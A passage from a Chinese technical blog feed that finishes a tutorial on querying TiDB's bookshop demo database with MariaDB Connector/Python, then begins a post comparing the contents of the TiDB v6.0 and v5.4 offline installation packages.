<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~$ tiup demo bookshop prepare -H 192.168.8.101</span><br><span class="line">tiup is checking updates for component demo ...</span><br><span class="line">Starting component `demo`: /home/shawnyan/.tiup/components/demo/v0.0.8/tidb-dataset /home/shawnyan/.tiup/components/demo/v0.0.8/tidb-dataset bookshop prepare -H 192.168.8.101</span><br><span class="line">INFO[0000] Creating the tables if not existed....        dataset=bookshop</span><br><span class="line">INFO[0000] Creating table books.                         dataset=bookshop</span><br><span class="line">INFO[0000] Creating table users.                         dataset=bookshop</span><br><span class="line">INFO[0000] Creating table authors.                       dataset=bookshop</span><br><span class="line">INFO[0000] Creating table book_authors.                  dataset=bookshop</span><br><span class="line">INFO[0001] Creating table orders.                        dataset=bookshop</span><br><span class="line">INFO[0001] Creating table ratings.                       dataset=bookshop</span><br><span class="line">INFO[0001] Finished creating tables!                     dataset=bookshop</span><br><span class="line">INFO[0001] Clearing the old data....                     dataset=bookshop</span><br><span class="line">INFO[0002] Loading users data...                         dataset=bookshop</span><br><span class="line">INFO[0004] Loading books data...                         dataset=bookshop</span><br><span class="line">INFO[0006] Loading authors data...                       dataset=bookshop</span><br><span class="line">INFO[0008] Loading book authors data...                  dataset=bookshop</span><br><span class="line">INFO[0009] Loading book orders data...                   dataset=bookshop</span><br><span class="line">INFO[0039] Loading book ratings data...                  dataset=bookshop</span><br><span class="line">INFO[0071] Finished!                                     dataset=bookshop</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看新建库 <code>bookshop</code> 表数据量：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line"> CONCAT(table_schema,<span class="string">&#x27;.&#x27;</span>,table_name) <span class="keyword">AS</span> <span class="string">&#x27;Table Name&#x27;</span>,</span><br><span class="line"> table_rows <span class="keyword">AS</span> <span class="string">&#x27;Number of Rows&#x27;</span></span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line"> information_schema.TABLES</span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> <span class="string">&#x27;bookshop&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行结果为：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-----------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Table</span> Name            <span class="operator">|</span> Number <span class="keyword">of</span> <span class="keyword">Rows</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> bookshop.authors      <span class="operator">|</span>          <span class="number">20000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> bookshop.book_authors <span class="operator">|</span>          <span class="number">20000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> bookshop.books        <span class="operator">|</span>          <span class="number">20000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> bookshop.orders       <span class="operator">|</span>         <span class="number">300000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> bookshop.ratings      <span class="operator">|</span>         <span class="number">300000</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> bookshop.users        <span class="operator">|</span>           <span class="number">9985</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+----------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.018</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="使用-Python-连接器创建连接">使用 Python 连接器创建连接</h3>
<p>需要配置连接信息，默认为不自动提交：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">conn_params = &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;host&quot;</span>: <span class="string">&quot;192.168.8.101&quot;</span>,</span><br><span class="line">    <span class="string">&quot;port&quot;</span>: <span class="number">4000</span>,</span><br><span class="line">    <span class="string">&quot;database&quot;</span>: <span class="string">&quot;bookshop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autocommit&quot;</span>: <span class="literal">False</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="检查基本连接信息">检查基本连接信息</h3>
<p>可调用连接器内置方法，直接查看数据库版本和会话的字符集。发送查询语句，查看自动提交的参数值。</p>
<ul>
<li>示例代码如下：</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2. Check Conn Info (Server Version, Charset)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Server Version:&quot;</span>, conn.server_info)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Connection Charset:&quot;</span>, conn.character_set, conn.collation)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. Check Server Variables</span></span><br><span class="line">cursor.execute(<span class="string">&quot;SHOW VARIABLES LIKE &#x27;autocommit&#x27;&quot;</span>)</span><br><span class="line">resAutoCommit = cursor.fetchone()</span><br><span class="line"><span class="built_in">print</span>(resAutoCommit)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行结果如下：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server Version: 5.7.25-TiDB-v6.0.0</span><br><span class="line">Connection Charset: utf8mb4 utf8mb4_general_ci</span><br><span class="line">(&#x27;autocommit&#x27;, &#x27;OFF&#x27;)</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>注：<br>
使用 MariaDB Connector/Python 连接数据库，会总是使用 <code>utf8mb4</code>。</p>
</blockquote>
<h3 id="单值写入">单值写入</h3>
<p>下面将分单值写入、多值写入、单值查询，以及多值查询四种情况分别做演示。</p>
<p>向 <code>books</code> 表中插入一条数据，并在之后手动提交：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 4. Insert One Row</span></span><br><span class="line">sqlInsertOne = <span class="string">&quot;REPLACE INTO books (id, title, published_at) VALUES (1, &#x27;tidb-monthly&#x27;, &#x27;2022-05-09&#x27;)&quot;</span></span><br><span class="line">cursor.execute(sqlInsertOne)</span><br><span class="line">conn.commit()</span><br></pre></td></tr></table></figure></div>
<p>如果 TiDB Server 已开启 General 日志，则可以在日志文件中看到：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022/05/12 22:26:05.103 +08:00] [INFO] [session.go:3264] [GENERAL_LOG] [conn=467] [user=root@%] [schemaVersion=144] [txnStartTS=0] [forUpdateTS=0] [isReadConsistency=false] [current_db=bookshop] [txn_mode=PESSIMISTIC] [sql=&quot;REPLACE INTO books (id, title, published_at) VALUES (1, &#x27;tidb-monthly&#x27;, &#x27;2022-05-09&#x27;)&quot;]</span><br><span class="line">[2022/05/12 22:26:05.120 +08:00] [INFO] [session.go:3264] [GENERAL_LOG] [conn=467] [user=root@%] [schemaVersion=144] [txnStartTS=433157718689710084] [forUpdateTS=433157718689710084] [isReadConsistency=false] [current_db=bookshop] [txn_mode=PESSIMISTIC] [sql=COMMIT]</span><br></pre></td></tr></table></figure></div>
<h3 id="多值写入">多值写入</h3>
<p>也可将多组值包装到一个字典中，然后传递给执行器，此时就用到了 <code>executemany</code>，可一次性执行多条语句，并将其封装在一个事务内，以保证写入数据的完整性。</p>
<ul>
<li>演示代码如下：</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 5. Insert Multi Rows</span></span><br><span class="line">data = [</span><br><span class="line">    (<span class="number">10</span>, <span class="string">&#x27;TiDB Book Rush&#x27;</span>, <span class="string">&#x27;2022-05-10&#x27;</span>),</span><br><span class="line">    (<span class="number">11</span>, <span class="string">&#x27;TiDB Blog&#x27;</span>, <span class="string">&#x27;2022-05-11&#x27;</span>),</span><br><span class="line">    (<span class="number">12</span>, <span class="string">&#x27;TiDB 6.0 Release&#x27;</span>, <span class="string">&#x27;2022-05-12&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">sqlInsertMulti = <span class="string">&quot;REPLACE INTO books (id, title, published_at) VALUES (?, ?, ?)&quot;</span></span><br><span class="line">cursor.executemany(sqlInsertMulti, data)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>TiDB Server 的 General 日志打印如下：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022/05/12 22:26:05.131 +08:00] [INFO] [session.go:3264] [GENERAL_LOG] [conn=467] [user=root@%] [schemaVersion=144] [txnStartTS=0] [forUpdateTS=0] [isReadConsistency=false] [current_db=bookshop] [txn_mode=PESSIMISTIC] [sql=BEGIN]</span><br><span class="line">[2022/05/12 22:26:05.154 +08:00] [INFO] [session.go:3264] [GENERAL_LOG] [conn=467] [user=root@%] [schemaVersion=144] [txnStartTS=433157718702817281] [forUpdateTS=433157718702817281] [isReadConsistency=false] [current_db=bookshop] [txn_mode=PESSIMISTIC] [sql=&quot;REPLACE INTO books (id, title, published_at) VALUES (?, ?, ?) [arguments: (10, \&quot;TiDB Book Rush\&quot;, \&quot;2022-05-10\&quot;)]&quot;]</span><br><span class="line">[2022/05/12 22:26:05.162 +08:00] [INFO] [session.go:3264] [GENERAL_LOG] [conn=467] [user=root@%] [schemaVersion=144] [txnStartTS=433157718702817281] [forUpdateTS=433157718702817281] [isReadConsistency=false] [current_db=bookshop] [txn_mode=PESSIMISTIC] [sql=&quot;REPLACE INTO books (id, title, published_at) VALUES (?, ?, ?) [arguments: (11, \&quot;TiDB Blog\&quot;, \&quot;2022-05-11\&quot;)]&quot;]</span><br><span class="line">[2022/05/12 22:26:05.168 +08:00] [INFO] [session.go:3264] [GENERAL_LOG] [conn=467] [user=root@%] [schemaVersion=144] [txnStartTS=433157718702817281] [forUpdateTS=433157718702817281] [isReadConsistency=false] [current_db=bookshop] [txn_mode=PESSIMISTIC] [sql=&quot;REPLACE INTO books (id, title, published_at) VALUES (?, ?, ?) [arguments: (12, \&quot;TiDB 6.0 Release\&quot;, \&quot;2022-05-12\&quot;)]&quot;]</span><br><span class="line">[2022/05/12 22:26:05.178 +08:00] [INFO] [session.go:3264] [GENERAL_LOG] [conn=467] [user=root@%] [schemaVersion=144] [txnStartTS=433157718702817281] [forUpdateTS=433157718702817281] [isReadConsistency=false] [current_db=bookshop] [txn_mode=PESSIMISTIC] [sql=COMMIT]</span><br></pre></td></tr></table></figure></div>
<h3 id="单值读取">单值读取</h3>
<p>因为 TiDB 使用 <code>utf8_bin</code> 做为默认校验规则，所以查询条件会区分大小写，这里使用内置函数 <code>lower()</code> 将所有字符转成小写，来消除大小写区分的影响。</p>
<ul>
<li>使用 <code>fetchone()</code> 方法查询一条结果，并用 <code>|</code> 作为分隔符将结果打印。</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 6. Query Data -- One Row</span></span><br><span class="line">cursor.execute(<span class="string">&quot;SELECT * FROM books where lower(title) like &#x27;tidb%&#x27;&quot;</span>)</span><br><span class="line">row = cursor.fetchone()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Select One Row:&quot;</span>, *row, sep=<span class="string">&#x27;|&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>控制台打印结果为：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select One Row:|1|tidb-monthly|Magazine|2022-05-09 00:00:00|0|0.00</span><br></pre></td></tr></table></figure></div>
<h3 id="多值读取">多值读取</h3>
<p>对于多值读取的情况，可使用 <code>fetchmany(size: int)</code> 方法，传入欲获取的行数后执行，即可得到需要的结果集。<br>
本例中，因为上文只写入4条数据，所以也只能查到4条，代码如下。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 7. Query Data -- Many</span></span><br><span class="line">cursor.execute(<span class="string">&quot;SELECT * FROM books where lower(title) like &#x27;tidb%&#x27;&quot;</span>)</span><br><span class="line">row = cursor.fetchmany(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rows_affected:&quot;</span>, cursor.rowcount)</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> row:</span><br><span class="line">    res.append(&#123;<span class="string">&quot;id&quot;</span>: i[<span class="number">0</span>], <span class="string">&quot;book&quot;</span>: i[<span class="number">1</span>], <span class="string">&quot;published&quot;</span>: <span class="string">&quot;&#123;:%Y-%m-%d&#125;&quot;</span>.<span class="built_in">format</span>(i[<span class="number">3</span>])&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Select Many Rows:&quot;</span>, res)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>控制台输出结果：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rows_affected: 4</span><br><span class="line">Select Many Rows: [&#123;&#x27;id&#x27;: 1, &#x27;book&#x27;: &#x27;tidb-monthly&#x27;, &#x27;published&#x27;: &#x27;2022-05-09&#x27;&#125;, &#123;&#x27;id&#x27;: 10, &#x27;book&#x27;: &#x27;TiDB Book Rush&#x27;, &#x27;published&#x27;: &#x27;2022-05-10&#x27;&#125;, &#123;&#x27;id&#x27;: 11, &#x27;book&#x27;: &#x27;TiDB Blog&#x27;, &#x27;published&#x27;: &#x27;2022-05-11&#x27;&#125;, &#123;&#x27;id&#x27;: 12, &#x27;book&#x27;: &#x27;TiDB 6.0 Release&#x27;, &#x27;published&#x27;: &#x27;2022-05-12&#x27;&#125;]</span><br></pre></td></tr></table></figure></div>
<h2 id="小结">小结</h2>
<p>到此，以上四种情况已全部演示完毕。<br>
最后，以一个完整示例作为本文结尾。</p>
<ul>
<li>示例：查询 <code>Books</code> 表所在的 TiKV 节点的版本和地址，并输出结果。</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: @ShawnYan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> mariadb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. Connecting</span></span><br><span class="line">conn_params = &#123;</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;host&quot;</span>: <span class="string">&quot;192.168.8.101&quot;</span>,</span><br><span class="line">    <span class="string">&quot;port&quot;</span>: <span class="number">4000</span>,</span><br><span class="line">    <span class="string">&quot;database&quot;</span>: <span class="string">&quot;bookshop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autocommit&quot;</span>: <span class="literal">False</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn = mariadb.connect(**conn_params)</span><br><span class="line">cursor = conn.cursor(buffered=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Check Conn Info (Server Version, Charset)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Server Version:&quot;</span>, conn.server_info)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Connection Charset:&quot;</span>, conn.character_set, conn.collation)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. Query Data -- Many</span></span><br><span class="line">cursor.execute(</span><br><span class="line">    <span class="string">&quot;SELECT DISTINCT t1.DB_NAME,t1.TABLE_NAME, t1.REGION_ID, t3.ADDRESS, t3.version &quot;</span></span><br><span class="line">    <span class="string">&quot;FROM information_schema.tikv_region_status t1 INNER JOIN information_schema.tikv_region_peers t2 &quot;</span></span><br><span class="line">    <span class="string">&quot;ON t1.REGION_ID = t2.region_id INNER JOIN information_schema.TIKV_STORE_STATUS t3 ON t2.STORE_ID = t3.STORE_ID &quot;</span></span><br><span class="line">    <span class="string">&quot;WHERE t1.DB_NAME = &#x27;bookshop&#x27; AND t1.TABLE_NAME = &#x27;books&#x27;&quot;</span>)</span><br><span class="line">row = cursor.fetchall()</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> row:</span><br><span class="line">    res.append(&#123;<span class="string">&quot;DB&quot;</span>: i[<span class="number">0</span>], <span class="string">&quot;TABLE&quot;</span>: i[<span class="number">1</span>], <span class="string">&quot;REGION_ID&quot;</span>: i[<span class="number">2</span>], <span class="string">&quot;TIKV_ADDR&quot;</span>: i[<span class="number">3</span>], <span class="string">&quot;TIKV_VERSION&quot;</span>: i[<span class="number">4</span>]&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Select Many Rows:&quot;</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free resources</span></span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></div>
<p>输出结果为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server Version: 5.7.25-TiDB-v6.0.0</span><br><span class="line">Connection Charset: utf8mb4 utf8mb4_general_ci</span><br><span class="line">Select Many Rows: [&#123;&#x27;DB&#x27;: &#x27;bookshop&#x27;, &#x27;TABLE&#x27;: &#x27;books&#x27;, &#x27;REGION_ID&#x27;: 4028065, &#x27;TIKV_ADDR&#x27;: &#x27;192.168.8.101:20161&#x27;, &#x27;TIKV_VERSION&#x27;: &#x27;6.0.0&#x27;&#125;]</span><br></pre></td></tr></table></figure></div>
<p>以上就是本文的全部内容，其他开发语言的开发实践，请参考官方文档，或扩展阅读。</p>
<h2 id="扩展阅读">扩展阅读</h2>
<ul>
<li>
<p>来自 PingCAP Education 原厂，适合 <a class="link"   href="https://pingcap.com/zh/courses-catalog/back-end-developer" >开发人员的课程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ：</p>
<ul>
<li><a class="link"   href="https://learn.pingcap.com/learner/course/600003" >DEV COURSE 1：TiDB 的架构与特点 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/course/1050001" >DEV COURSE 2：在 TiDB 上学习 SQL 语句 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/course/750002" >DEV COURSE 3：TiDB 特有功能与事务控制 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/course/840002" >DEV COURSE 4：使用 Connector/J <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://learn.pingcap.com/learner/course/780002" >DEV COURSE 5：在 TiDB 上开发应用的最佳实践 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
</li>
<li>
<p><a class="link"   href="https://asktug.com/t/topic/664974" >TiDB 应用开发专区&amp;开发者手册&amp;干货合集 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> @<a class="link"   href="https://asktug.com/u/billmay/summary" >Billmay <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li>
<p><a class="link"   href="https://asktug.com/t/topic/663914" >TiDB 6.0 Book Rush！一起来分布式创作 6.0 的使用手册吧！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> @<a class="link"   href="https://asktug.com/u/luzizhuo/summary" >luzizhuo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/403262" >https://www.modb.pro/db/403262 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/blog/ef4c1f65?shareId=2923d1b6" >https://tidb.net/blog/ef4c1f65?shareId=2923d1b6 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/book/book-rush/developer-guide/simple-crud/sample-application-python" >https://tidb.net/book/book-rush/developer-guide/simple-crud/sample-application-python <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 6.x</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>python</tag>
        <tag>tidb</tag>
        <tag>tidb 6.x</tag>
        <tag>pingcap</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 6.x 新特性解读 | 离线包变更</title>
    <url>/2022/tidb/tidb-6.0-offline-package/</url>
    <content><![CDATA[<img  alt="IMG_2005.JPG" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/IMG_2005-1652257515326.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="背景">背景</h2>
<p>TiDB 6.0 已发版一月有余，相信很多 TiDBer 已经对新版本做了升级测试。对于初装或者升级，都离不开安装介质。而针对数据库这种对信息安全要求级别很高的软件系统，绝大部分场景都应该部署在私有云环境，或者说是内网环境中。那么如何能够顺利、快速地在离线状态下进行安装也是很重要的，伴随着 TiDB 6.0 的发版，离线包也发生了一些变化。<br>
本文将对 TiDB 6.0 离线安装包的变更进行分析，希望对读者在准备离线部署时有所提示或帮助。</p>
<h2 id="离线包变更">离线包变更</h2>
<p>先来看下官方文档对 <a class="link"   href="https://docs.pingcap.com/zh/tidb/v6.0/release-6.0.0-dmr#%E7%A6%BB%E7%BA%BF%E5%8C%85%E5%8F%98%E6%9B%B4" >离线包变更 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的表述：</p>
<blockquote>
<p>离线包变更<br>
TiDB 提供两个离线包下载：v6.0.0 TiDB-community-server 软件包和 v6.0.0 TiDB-community-toolkit 软件包。<br>
在 6.0.0-DMR 版本中，两个离线包的内容物做了一些调整。</p>
</blockquote>
<p>接下来，将对 TiDB v6.0 和 v5.4 的离线包进行比对，并具体分析新版本都做了哪些调整。</p>
<h3 id="离线包的内容物">离线包的内容物</h3>
<p>分别下载 TiDB v6.0 和 v5.4 两个版本的离线包，共 4 个压缩包。</p>
<ul>
<li><a class="link"   href="https://download.pingcap.org/tidb-community-server-v6.0.0-linux-amd64.tar.gz" >tidb-community-server-v6.0.0-linux-amd64.tar.gz <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://download.pingcap.org/tidb-community-toolkit-v6.0.0-linux-amd64.tar.gz" >tidb-community-toolkit-v6.0.0-linux-amd64.tar.gz <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://download.pingcap.org/tidb-community-server-v5.4.0-linux-amd64.tar.gz" >tidb-community-server-v5.4.0-linux-amd64.tar.gz <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://download.pingcap.org/tidb-community-toolkit-v5.4.0-linux-amd64.tar.gz" >tidb-community-toolkit-v5.4.0-linux-amd64.tar.gz <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>下载链接可从 <a class="link"   href="https://pingcap.com/zh/product-community/" >社区版软件包 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面获取。<br>
将这四个压缩包分别解压，并查看解压后的文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">for i in `ls tidb-*`; do tar zxf $i; done</span><br><span class="line">ls tidb-*</span><br></pre></td></tr></table></figure></div>
<p>汇总成如下表格。从表格中可以看出新版本的离线包内容物做了明显调整。分别从 server, toolkit 两个方面展开讲。</p>
<img  alt="1.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220511-2e43730d-0892-4871-a55a-7e6cea8d289b.jpg"
                      referrerpolicy="no-referrer"
                >
<h3 id="tidb-community-server-version-linux-amd64-tar-gz-的变化"><code>tidb-community-server-&#123;version&#125;-linux-amd64.tar.gz</code> 的变化</h3>
<p>除常规的组件版本升级之外，有三点主要的变化：</p>
<ol>
<li>从表格里可以看出，原先 <code>tidb-community-server-v5.4.0</code> 里的工具，已全部移动到了 <code>tidb-community-toolkit-v6.0.0</code>，只保留基础核心组件。</li>
<li>组件 <code>diag</code> 的版本号从 v0.5.1 升级到 v0.7.0，超越了其他组件的版本号升级幅度。</li>
<li>较 v5.4.0 而言，v6.0.0 的离线包中移除了3个组件，<code>client</code>, <code>server</code> 和 <code>pushgateway</code>。</li>
</ol>
<h4 id="diag">diag</h4>
<p>我们知道，TiDB v6.0 新增了 Clinic 诊断服务，而 diag 是该诊断服务的重要组件，负责收集、汇总整个集群的诊断数据，同时可以将诊断数据上报到 Clinic Server，以供技术支持人员远程定位问题。<br>
但由于 diag 目前尚未开源，具体变更不得而知，但我们有理由相信，diag 是为了更好地配合 clinic 的发布而进行了大版本升级。这从 diag 的具体命令和使用方式上可窥视一般。</p>
<p>比较两个版本的 diag 命令，可以看到移除了一个命令 <code>download</code>，新增了一个命令 <code>config</code>。</p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line">diag help</span><br><span class="line">&lt; download    download file</span><br><span class="line">&gt; config      set an individual value in diag configuration file</span><br></pre></td></tr></table></figure></div>
<p><code>diag config</code> 用于配置上传数据到 Clinic Server 的 Access Token。获取方式和配置方式请参考 <a class="link"   href="https://docs.pingcap.com/zh/tidb/dev/quick-start-with-clinic#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C" >官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<blockquote>
<p>使用 Diag 上传数据时，你需要通过 Token 进行用户认证，以保证数据上传到组织后被安全地隔离。获取一个 Token 后，你可以重复使用该 Token。Token 只用于上传数据。</p>
</blockquote>
<p>在命令行中，对 diag 配置 Token：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~$ tiup diag config clinic.token eyJ***</span><br><span class="line">tiup is checking updates for component diag ...</span><br><span class="line">Starting component `diag`: /home/shawnyan/.tiup/components/diag/v0.7.0/diag /home/shawnyan/.tiup/components/diag/v0.7.0/diag config clinic.token eyJ***</span><br><span class="line">shawnyan@centos7:~$</span><br></pre></td></tr></table></figure></div>
<p>由于篇幅有限，diag 后接命令的详细参数这里就不展开讲解了，感兴趣的读者可以自行比对。</p>
<p>此外，用于收集操作系统和硬件信息的 <code>insight</code> 工具也已并入 <code>diag</code> 包，便于 Clinic 收集集群节点信息，并输出到 <code>insight.json</code> 文件中。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tiup diag collect shawnyan-cluster --include=&quot;system&quot;</span><br></pre></td></tr></table></figure></div>
<h4 id="移除-client-server-和-pushgateway">移除 <code>client</code>, <code>server</code> 和 <code>pushgateway</code></h4>
<ul>
<li>client-v1.9.0-linux-amd64.tar.gz</li>
</ul>
<p><code>tiup client</code> 用于连接 TiDB，以替代 mysql client。</p>
<ul>
<li>server-v1.9.0-linux-amd64.tar.gz</li>
</ul>
<p><code>tiup server</code> 用于搭建私有仓库，已在之前的文章 <a href="https://shawnyan.cn/2022/tidb/tiup-intro/">TiUP：TiDBAer 必备利器</a> 中详细介绍过，这里不再赘述。</p>
<p>但是，个人认为这个组件应该保留在离线包中，因为内网环境下，需要使用 <code>server</code> 来搭建内部镜像站，已提 <a class="link"   href="https://github.com/pingcap/tiup/issues/1876" >Issue#1876 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，期待这个组件可以回归。</p>
<ul>
<li>pushgateway-v0.7.0-linux-amd64.tar.gz</li>
</ul>
<p>pushgateway 作为独立组件一直保留，但是对于 Grafana 监控系统而言，<a class="link"   href="https://docs.pingcap.com/zh/tidb/v6.0/grafana-monitor-best-practices#%E7%9B%91%E6%8E%A7%E6%9E%B6%E6%9E%84" >从 TiDB 2.1.3 版本开始，去掉了 Pushgateway 这个单点组件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。故在 TiDB v6.0 中彻底将其移除可以理解。</p>
<h3 id="tidb-community-toolkit-version-linux-amd64-tar-gz-的变化"><code>tidb-community-toolkit-&#123;version&#125;-linux-amd64.tar.gz</code> 的变化</h3>
<p>在 v5.4 版本的包中，只有 7 个可执行的二进制文件，而在 v6.0 中就非常丰富了，除了从 <code>tidb-community-server</code> 包中转移过来的工具，还发生了一些新的变化。</p>
<img  alt="2.jpg" 
                     lazyload
                     src="/img/loading.svg"
